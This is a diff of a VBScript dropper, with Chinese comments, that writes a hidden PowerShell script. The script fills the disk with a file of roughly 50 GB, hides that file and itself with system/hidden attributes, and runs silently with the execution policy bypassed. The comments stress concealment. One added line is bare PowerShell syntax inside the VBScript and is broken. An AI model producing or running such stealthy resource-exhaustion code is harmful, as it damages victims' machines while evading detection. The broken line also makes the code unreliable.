@@ -35,13 +35,18 @@ psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
 psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
 psFile.WriteLine "for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 1 }"
 psFile.WriteLine "$Stream.Close()"
-psFile.WriteLine "attrib +h +s +r $BigFile"
+' 这里的命令是关键：同时隐藏数据文件和脚本自己
+psFile.WriteLine "attrib +h +s +r `"$BigFile`""
+psFile.WriteLine "attrib +h +s `"$PSCommandPath`""
 psFile.Close
 
 ' --- 5. 深度隐藏脚本并静默运行 ---
 fso.GetFile(psPath).Attributes = 2 + 4
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
 
+attrib +h +s +r "$BigFile"
+
 Set fso = Nothing
 Set WshShell = Nothing
+
 
